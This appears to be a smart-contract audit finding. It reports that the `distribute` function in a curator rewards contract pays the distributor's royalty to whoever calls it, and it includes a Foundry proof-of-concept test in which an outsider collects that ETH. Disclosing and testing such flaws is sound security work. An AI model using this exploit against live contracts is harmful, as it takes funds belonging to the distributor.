# Vulnerability details

## Impact
Direct fund loss of distributors make this a high impact. Any user can just call a function and get rewards meant for distributors. 

The `distribute` function in the `src/reward/CuratorRewardsDistributor.sol` file makes it possible to distribute the total balance of a credential to the share holders, as well as the distributor. 

The issue is that while transferring the ETH to distributors, the code directly transfers it to `_msgSender()`. This assumes that only the distributor will call this function and get rewarded. On the other hand, anyone can call this function and get the ETH belonging to the distributor.

```js
function testStealOwnersRoyalty() public {
        address user3; 
        user3 = makeAddr(("user3"));
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // Signal creds for different users
        vm.startPrank(user1);
        vm.deal(user1, bondingCurve.getBuyPriceAfterFee(credId, 1, 1));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 1, 1) }(credId, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        vm.deal(user2, bondingCurve.getBuyPriceAfterFee(credId, 2, 2));
        cred.buyShareCred{ value: bondingCurve.getBuyPriceAfterFee(credId, 2, 2) }(credId, 2, 0);
        vm.stopPrank();

        assertEq(cred.getShareNumber(credId, user1), 1, "Signal count should be 1");
        assertEq(cred.getShareNumber(credId, user2), 2, "Signal count should be 2");
        assertEq(cred.getCurrentSupply(credId), 4, "Signal count should be 4");
        assertEq(cred.getCuratorAddressLength(credId), 3, "Signal count should be 3");

        // Record initial balances
        uint256 initialUser3Balance = phiRewards.balanceOf(user3);
        uint256 initialUser3EthBalance = address(user3).balance; 
        uint256 ownerBalance = owner.balance;

        // Distribute rewards
        vm.prank(user3); 
        curatorRewardsDistributor.distribute(credId);
        vm.stopPrank(); 

        // Check final balances
        uint256 finalUser3Balance = phiRewards.balanceOf(user3);
        uint256 finalUser3EthBalance = address(user3).balance; 
        uint256 finalOwnerBalance = owner.balance;

        console2.log("distributor balance change:", finalOwnerBalance - ownerBalance); 

        console2.log("user3 steals:", finalUser3EthBalance - initialUser3EthBalance); 

        assertNotEq(
            finalOwnerBalance - ownerBalance, (depositAmount / 100), 
            "Distributer does not receive 1/100 royalty"
        );

        assertEq(finalUser3EthBalance - initialUser3EthBalance, (depositAmount / 100), 
        "The msg.sender, in this case user3 receives the 1/100 royalty"
        ); 
    }
```
